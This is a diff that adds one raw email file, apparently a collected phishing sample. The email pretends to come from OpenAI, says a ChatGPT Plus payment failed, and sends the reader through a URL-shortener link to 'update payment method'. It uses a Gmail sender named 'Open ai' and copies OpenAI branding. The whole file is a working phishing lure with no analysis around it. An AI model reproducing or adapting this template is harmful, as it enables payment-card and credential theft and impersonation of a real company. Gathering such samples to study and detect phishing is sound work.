@@ -1,0 +1,224 @@
+Return-Path: <georges.abitbole.08@gmail.com>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id sN11FdZA7WiffQAAOB6+FQ
+	(envelope-from <georges.abitbole.08@gmail.com>)
+	for <info@vorteksenerji.com>; Mon, 13 Oct 2025 21:11:34 +0300
+Return-path: <georges.abitbole.08@gmail.com>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Mon, 13 Oct 2025 21:11:34 +0300
+Received: from mail-ed1-f68.google.com ([209.85.208.68]:42029)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <georges.abitbole.08@gmail.com>)
+	id 1v8N1C-000000000MO-1DMa
+	for info@vorteksenerji.com;
+	Mon, 13 Oct 2025 21:11:34 +0300
+Received: by mail-ed1-f68.google.com with SMTP id 4fb4d7f45d1cf-63a10267219so1849740a12.0
+        for <info@vorteksenerji.com>; Mon, 13 Oct 2025 11:11:14 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1760379053; x=1760983853; darn=vorteksenerji.com;
+        h=subject:to:mime-version:from:date:message-id:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=2I2dUkpaUuwsqwq3556v0zw6ZlbQhPHnectXG2IBX2U=;
+        b=dJzN+ib3xGeUdExqh9st9H+A9i69fjAlNnHlO78npBxjnZeyp9/f/Ojqgheq8rIsme
+         luXgbjTBIJWSZ4VDGU2cFdrsDk/tckauQoENx0J6puvTxu4VTUpPtc6GN7aTXCkRMrfg
+         4x4Q2Fi9JQGTJ1ngnzJnydP7PALWQnt4W3Wmn0zrLFAQvO/2XdzCuyKVde7PnFlOGXfK
+         1RJtX5sD83HB/z1yNiwA/jU/OQvdK8dDQMoJcqRR3WgBniKOo7aWBlIyyAbFnSQ/HIcu
+         +3MrKs8ArFhoFNd2FE7JCJFssRKC37H2GhbXhzzGW1MQsFqos2Z/Julh8iGdcQOVcoZ1
+         gveg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1760379053; x=1760983853;
+        h=subject:to:mime-version:from:date:message-id:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=2I2dUkpaUuwsqwq3556v0zw6ZlbQhPHnectXG2IBX2U=;
+        b=K8bPF31vcP5Lhn/Ik5cCYH71sS8sfq8BqB5aHcI6l/YqLDRJdARDeXQLKAT1iStb1y
+         hmsyMnIHK5UzMy2f6RJAatqwdEoZaTbr4vbWkmXD0smDGqCjU4Y4tWVs18Rt8zue2VwI
+         afEc1qq9rL/Qn4uFUAcULgqX5Zez+E+wMGHTGqdOEJbvzMn0igEO07h97OZhkFZ+DpiS
+         52ncK8wMvnrsddfjbidU2+ZcvPaWRd0/zkZ53VK0T8suWjQlXdYk2iBEFSjPwhjGEFMS
+         a4ebsspj0opZGJuLKtrXps2WyLBw1Q8/1pgCYJf7Y/0MW8Tir9IwzzWonIn2mfhSiTp+
+         sHrQ==
+X-Gm-Message-State: AOJu0YzHRS9kBDQnexT/Z9dkUpVbJaAQ/esBS5Rg0pQ+6KMahNQhq2/M
+	OKETaj65JbNoYtY3GTQ5RHjGCWCz86kbHh9eW4UWUzgbTDCzNCp0O+1GG6hy1XqiBjI=
+X-Gm-Gg: ASbGncvazL8BGYuR8pm0qltswtPbBSBMx4GeIx4PKMITCWjS4YqSk2a1lAfqSxcnpxt
+	ZlrweFhXZkao+qDyQYKI0wQsxsAFubL+Wq2MvcwLSamP85ZsRGGh7xIZcPSyGPIJNavpfShMneb
+	RFOxWZ0QnvkTqFPcwTE+0bnd9ZBQBL3kisUOruywKCypEfxxtyIagUgoNph0DfTDrtu3MioUDFw
+	tUQwkHQpyEToIU3h15AhlCXo2KS4DLSan6EneDViG3Bx7SPCthEMKv6LEdrpepkZ0ajvKTgJAXQ
+	1XnPJyxHrHxdfPhrbER3kQRXPAQxZ486lQDdRExQF6azM2nI9lTiFQ8A28aFmkhUds8Wd6tCAPU
+	WyzgHXFITYpqANo7rr3xXKm4XLrv+ICeblqNHArJek+bDD66S5L4k/S41AlYfvgBbow3GPkzlkk
+	87wJFdg2RFyskUFetmb3vvz7o/XJmKVwmF+VifH1DCCLVBOaB1FEz8HnV5+WWjeOuRp0dr
+X-Google-Smtp-Source: AGHT+IEgXkwqSilzPSRJqAWnmw/evGbIibR4qAzJmSZehedswTxKd9RXe7v2pqrFcnYb5ug5NwrD3w==
+X-Received: by 2002:a05:6402:4019:b0:639:e04d:b0cd with SMTP id 4fb4d7f45d1cf-639e04db5bdmr21809744a12.10.1760379053053;
+        Mon, 13 Oct 2025 11:10:53 -0700 (PDT)
+Received: from [5.180.34.46] ([5.180.34.46])
+        by smtp.gmail.com with ESMTPSA id 4fb4d7f45d1cf-63a5235dca9sm9356421a12.8.2025.10.13.11.10.52
+        for <info@vorteksenerji.com>
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 13 Oct 2025 11:10:52 -0700 (PDT)
+Message-ID: <68ed40ac.a70a0220.4239f.af7c@mx.google.com>
+Date: Mon, 13 Oct 2025 11:10:52 -0700 (PDT)
+From: Open ai <georges.abitbole.08@gmail.com>
+X-Google-Original-From: Open ai <leonidlazarevsq6352@rambler.ru>
+Content-Type: multipart/mixed; boundary="===============1732265709548550645=="
+MIME-Version: 1.0
+To: info@vorteksenerji.com
+Subject: Action Required: Update Your Payment Method for ChatGPT Plus.
+
+--===============1732265709548550645==
+Content-Type: text/html; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML lang=en><HEAD><TITLE>Update Your Payment Method</TITLE>
+<META content="text/html; charset=unicode" http-equiv=Content-Type>
+<META name=viewport content="width=device-width, initial-scale=1.0">
+<STYLE>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: #333333;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        
+        .email-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header {
+            padding: 25px 30px;
+            text-align: center;
+            border-bottom: 1px solid #eeeeee;
+        }
+        
+        .logo {
+            max-width: 180px;
+            height: auto;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        h1 {
+            font-size: 28px;
+            color: #202123;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+        
+        p {
+            margin-bottom: 20px;
+            font-size: 16px;
+            color: #555555;
+        }
+        
+        .button {
+            display: inline-block;
+            background-color: #10a37f;
+            color: white;
+            text-decoration: none;
+            padding: 14px 30px;
+            border-radius: 50px;
+            font-weight: 600;
+            margin: 25px 0;
+            transition: background-color 0.3s;
+        }
+        
+        .button:hover {
+            background-color: #0d8c6d;
+        }
+        
+        ul {
+            margin: 20px 0;
+            padding-left: 20px;
+        }
+        
+        li {
+            margin-bottom: 12px;
+            font-size: 16px;
+            color: #555555;
+        }
+        
+        .footer {
+            background-color: #f8f8f8;
+            padding: 30px;
+            text-align: center;
+            border-top: 1px solid #eeeeee;
+        }
+        
+        .address {
+            font-size: 14px;
+            color: #777777;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        .footer-links {
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: #777777;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 14px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: #10a37f;
+        }
+        
+        @media (max-width: 600px) {
+            .content, .header, .footer {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </STYLE>
+</HEAD>
+<BODY>
+<DIV class=email-container>
+<DIV class=header><IMG class=logo alt=ChatGPT 
+src="https://cdn.mcauto-images-production.sendgrid.net/d4ef4a73d51fe844/127ea16e-ad77-4ae4-9c4e-9011712ced8c/468x82.png"> 
+</DIV>
+<DIV class=content>
+<H1>Update your payment method to keep using Plus</H1>
+<P>We attempted to process your subscription payment for ChatGPT, but 
+unfortunately, the payment was declined.</P>
+<P>This may be due to an issue with your payment method. To continue enjoying 
+uninterrupted access to ChatGPT, please update your payment information.</P><A 
+class=button href="https://zpr.io/zCy6qcTLMYqr">Update Payment Method</A> 
+<UL>
+  <LI>Extended limits on messaging, file uploads, and voice mode 
+  <LI>More image and video generation 
+  <LI>Extended access to deep research and reasoning models </LI></UL>
+<P>If you have any questions, we're here to help at <A 
+href="mailto:support@openai.com">support@openai.com</A>.</P>
+<P>Best,<BR>The ChatGPT Team</P></DIV>
+<DIV class=footer>
+<DIV class=address>
+<P>3180 18th St<BR>San Francisco, CA 94110</P></DIV>
+<DIV class=footer-links><A href="https://openai.com/terms">Terms</A> <A 
+href="https://openai.com/privacy">Privacy</A> <A 
+href="https://openai.com">OpenAI.com</A> </DIV>
+<P>&#169; 2025 OpenAI. All rights reserved.</P></DIV></DIV></BODY></HTML>
+
+--===============1732265709548550645==--
